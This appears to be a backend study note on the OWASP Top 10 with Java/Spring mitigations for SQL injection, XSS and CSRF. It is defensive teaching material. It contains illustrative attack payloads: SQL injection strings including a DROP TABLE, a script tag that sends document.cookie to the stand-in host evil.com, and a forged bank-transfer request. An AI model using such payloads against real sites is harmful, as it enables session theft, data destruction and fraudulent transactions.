# Web Security Fundamentals (OWASP Top 10)

> **Phase 15 — Security → 15.1 Web Security Fundamentals**
> Goal: Understand the OWASP Top 10 and core web vulnerabilities — SQL Injection, XSS, CSRF — plus input validation and rate limiting as defenses, with Java/Spring mitigations.

---

## 0. The Big Picture

Security is **not a feature you add later** — it's a property you design in (and the cheapest place to fix a flaw is before it ships). Backend engineers must understand the common attack classes and how to defend against them. The industry's reference is the **OWASP Top 10** — the most critical web application security risks.

```
   Attacker ──malicious input / request──► Your API
        │
        defenses: validate input · parameterized queries · output encoding ·
                  authN/authZ (15.2) · encryption (15.3) · patched deps (15.4)
```

> Security spans the whole stack: HTTP (Phase 0.2), Spring Security (5.6), API design (7.1 — error handling, rate limiting), and the rest of Phase 15 (authN/authZ, data protection, dependency security). ⭐ **Defense in depth** — never rely on a single control.

---

## 1. The OWASP Top 10 (2021) ⭐

| # | Category | One-liner |
|---|----------|-----------|
| **A01** | **Broken Access Control** ⭐ | Users acting outside their permissions (most common) — authZ flaws (15.2) |
| **A02** | **Cryptographic Failures** | Weak/missing encryption of sensitive data (15.3) |
| **A03** | **Injection** ⭐ | Untrusted input interpreted as code/query (SQLi, XSS) (§2/§3) |
| **A04** | **Insecure Design** | Missing security controls by design (threat modeling) |
| **A05** | **Security Misconfiguration** | Defaults, verbose errors, open actuator/admin endpoints (9.2) |
| **A06** | **Vulnerable & Outdated Components** | Known-CVE dependencies (15.4) |
| **A07** | **Identification & Authentication Failures** | Weak login/session/password handling (15.2) |
| **A08** | **Software & Data Integrity Failures** | Untrusted deserialization, unsigned updates, supply chain |
| **A09** | **Security Logging & Monitoring Failures** | Can't detect/respond to attacks (9.1/9.2) — but don't log secrets! |
| **A10** | **Server-Side Request Forgery (SSRF)** | Server tricked into making attacker-chosen requests |
> ⭐ **A01 Broken Access Control** and **A03 Injection** are the most impactful for backend devs. The Top 10 maps across Phase 15: A02→15.3, A06→15.4, A07/A01→15.2. Each section addresses pieces.

---

## 2. SQL Injection (A03) ☠️

Untrusted input is concatenated into a SQL query, letting an attacker alter it (read/modify/delete data, bypass auth).
```java
// ☠️ VULNERABLE — string concatenation
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
// attacker sends email =  ' OR '1'='1   → returns ALL users; or '; DROP TABLE users; --
```
**Defense: parameterized queries / prepared statements** (the input is data, never code):
```java
// ✅ Parameterized (JDBC — Phase 4.7)
jdbcTemplate.query("SELECT * FROM users WHERE email = ?", rs -> ..., email);

// ✅ JPA/Spring Data — bind parameters, never concatenate (Phase 5.4)
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// ✅ Specifications / Criteria for dynamic queries (Phase 14.1 / 7.1) — not string building
```
| Defense | Note |
|---------|------|
| **Parameterized queries / PreparedStatement** ⭐ | The primary fix — input can't change query structure |
| **ORM/JPA with bound params** | Spring Data does this by default (don't break it with string concat) |
| **Input validation + allow-lists** | Defense in depth (§4) |
| **Least-privilege DB user** | Limit damage (no DROP/admin rights — Phase 4) |
| ⚠️ Never trust input | Including for `ORDER BY`/dynamic columns → whitelist (7.1 §2) |
> ⭐ **Parameterized queries eliminate SQL injection** — the driver sends query and data separately. ⚠️ The danger zone is **dynamic queries** (sorting/filtering — 7.1 §2): never build those from raw input — use Criteria/Specifications and whitelist column names. Also applies to NoSQL injection (Phase 4.8).

---

## 3. Cross-Site Scripting (XSS) (A03)

An attacker injects malicious **JavaScript** into a page that other users' browsers then execute (stealing cookies/tokens, performing actions as the victim).
| XSS type | How |
|----------|-----|
| **Stored** | Malicious script saved in the DB, served to all viewers |
| **Reflected** | Script bounced off a request param into the response |
| **DOM-based** | Client-side JS inserts untrusted data into the DOM |
```
   Attacker posts a comment:  <script>fetch('//evil.com?c='+document.cookie)</script>
   Other users view it → their browser runs it → cookie/token stolen
```
| Defense | Note |
|---------|------|
| **Output encoding / escaping** ⭐ | Encode data for its context (HTML/JS/URL) on render — the primary fix |
| **Content Security Policy (CSP)** | Header restricting which scripts can run (§5) |
| **Frameworks auto-escape** | Thymeleaf/React escape by default — don't bypass |
| **`HttpOnly` cookies** | JS can't read them → token theft harder (15.2) |
| **Validate/sanitize input** | Strip/allow-list HTML (e.g., OWASP Java HTML Sanitizer) |
> ⭐ For a **JSON REST API**, classic HTML XSS is less direct (you return data, not HTML), but: encode wherever your data ends up in a browser, set a strict **CSP**, and use **`HttpOnly`** cookies so a token can't be exfiltrated via script. XSS is fundamentally an **output**-encoding problem (encode for context), complemented by input sanitization.

---

## 4. Cross-Site Request Forgery (CSRF)

An attacker tricks a logged-in user's browser into sending an **unwanted authenticated request** to your site (the browser auto-attaches the session cookie).
```
   Victim is logged into bank.com (cookie sent automatically by the browser)
   Visits evil.com which auto-submits:  POST bank.com/transfer?to=attacker&amount=1000
   → browser includes the bank cookie → transfer happens without the user's intent
```
| Defense | Note |
|---------|------|
| **CSRF token** ⭐ | A secret per-session token required on state-changing requests; the attacker can't know it |
| **SameSite cookies** | `SameSite=Lax/Strict` stops cross-site cookie sending (modern default) |
| **Spring Security CSRF protection** | ⭐ **Enabled by default** for session-cookie apps (Phase 5.6) |
| Stateless JWT in `Authorization` header | Not auto-sent cross-site → CSRF largely N/A (but then watch XSS for token theft) |
> ⭐ ⚠️ **CSRF applies to cookie/session-based auth, not to token-in-header APIs.** If you use stateless **JWT in the `Authorization` header** (15.2), the browser doesn't auto-attach it cross-site, so CSRF protection is often disabled for those endpoints. If you use **cookies**, **keep Spring Security's CSRF protection on** + `SameSite`. (Spring disabling CSRF blindly is a common mistake — only do it when truly stateless.)

---

## 5. Input Validation, Rate Limiting & Security Headers

### 5.1 Input validation (defense in depth)
- ⭐ **Validate all input** at the boundary — Bean Validation (`@Valid`, `@NotNull`, `@Size`, `@Pattern`, `@Email` — Phase 5.3) → reject bad input early (400/422 + `ProblemDetail` — 7.1).
- **Allow-list** (accept known-good) over deny-list (block known-bad).
- Validate type, length, format, range. Validate on the **server** (client validation is UX only — never trust it).
> ⚠️ Validation **complements** (doesn't replace) parameterized queries/output encoding — it's defense in depth, not the primary injection fix.

### 5.2 Rate limiting (A04/abuse)
Throttle requests to prevent brute-force (login — 15.2), credential stuffing, scraping, and DoS. **429 + `Retry-After`** (recall Phase 7.1 §5; gateway + Redis — 12.4). A security control as much as a fairness one.

### 5.3 Security headers ⭐
| Header | Protects against |
|--------|------------------|
| **`Content-Security-Policy`** | XSS (restrict script sources) (§3) |
| **`Strict-Transport-Security` (HSTS)** | Forces HTTPS (downgrade attacks — 15.3) |
| **`X-Content-Type-Options: nosniff`** | MIME sniffing |
| **`X-Frame-Options` / `frame-ancestors`** | Clickjacking |
| **`Referrer-Policy`** | Info leakage |
> Spring Security sets sensible **security headers by default** (Phase 5.6) — keep them, tune CSP. ⚠️ Also: don't leak **stack traces/SQL/internal details** in error responses (A05/A09 — use `ProblemDetail`, 7.1) and **don't log secrets** (9.1/15.3).

---

## 6. Common Pitfalls / Misconceptions

| Pitfall | Fix |
|---------|-----|
| String-concatenated SQL | Parameterized queries / JPA params (§2) |
| Building dynamic ORDER BY/filters from input | Whitelist columns; Criteria/Specifications (§2, 7.1) |
| Trusting client-side validation | Always validate server-side (§5.1) |
| Disabling Spring Security CSRF blindly | Only for stateless token APIs; keep it for cookies (§4) |
| Rendering untrusted data unescaped | Output-encode for context; CSP (§3) |
| Reading tokens via JS (no HttpOnly) | `HttpOnly` + `Secure` + `SameSite` cookies (§3/§4) |
| Leaking stack traces/SQL in errors | Safe `ProblemDetail`; log server-side (§5.3, 7.1) |
| Over-privileged DB user | Least privilege (§2) |
| No rate limiting on login | Throttle + lockout (§5.2, 15.2) |
| Security as an afterthought | Design it in; defense in depth (§0) |

---

## 7. Connection to Backend / Spring (Why This Matters Later)

- **Spring Security** (Phase 5.6) provides CSRF protection, security headers, and the framework for authN/authZ (15.2).
- **Parameterized queries** ↔ JDBC (4.7), JPA/Specifications (5.4/14.1); **input validation** ↔ Bean Validation (5.3) → `ProblemDetail` (7.1).
- **Rate limiting** ↔ gateway + Redis (12.4 / 7.1); **don't leak errors** ↔ `@RestControllerAdvice` (5.3/7.1).
- A01/A07 → **AuthN/AuthZ** (15.2); A02 → **Data Protection** (15.3); A06 → **Dependency Security** (15.4); A09 → **logging/monitoring** (9.1/9.2).
- **CI security gates** (SonarQube/SAST — 10.3) catch some flaws.
- Critical across all **Projects** (esp. 4/5/7).

---

## 8. Quick Self-Check Questions

1. What is the OWASP Top 10, and which categories matter most to backend devs?
2. How does SQL injection work, and why do parameterized queries eliminate it?
3. Where is SQLi still a risk even with JPA, and how do you handle dynamic queries safely?
4. What are the three types of XSS, and what's the primary defense?
5. Why is XSS fundamentally an output-encoding problem? What do CSP and HttpOnly add?
6. How does CSRF work, and what are the defenses?
7. Why does CSRF apply to cookie auth but largely not to JWT-in-header APIs?
8. Why is server-side input validation essential, and allow-list vs deny-list?
9. How is rate limiting a security control?
10. Name four security headers and what each prevents.

---

## 9. Key Terms Glossary

- **OWASP Top 10:** the most critical web app security risks.
- **Injection / SQL injection:** untrusted input executed as code/query.
- **Parameterized query / prepared statement:** query + data sent separately.
- **XSS (stored/reflected/DOM):** injecting scripts run in victims' browsers.
- **Output encoding / CSP:** escaping data per context / script-source policy.
- **CSRF / CSRF token / SameSite:** forged authenticated request / anti-forgery secret / cookie scope.
- **Broken access control:** acting beyond permissions (authZ flaw).
- **Input validation / allow-list:** rejecting bad input / accepting known-good.
- **Rate limiting:** throttling to prevent abuse/brute-force.
- **Security headers (HSTS/CSP/nosniff/X-Frame-Options):** browser-enforced protections.
- **Defense in depth / least privilege:** layered controls / minimal permissions.

---

*This is the note for **Section 15.1 — Web Security Fundamentals**.*
*Previous section in roadmap: **14.4 Architecture Patterns**.*
*Next section in roadmap: **15.2 Authentication & Authorization Best Practices**.*
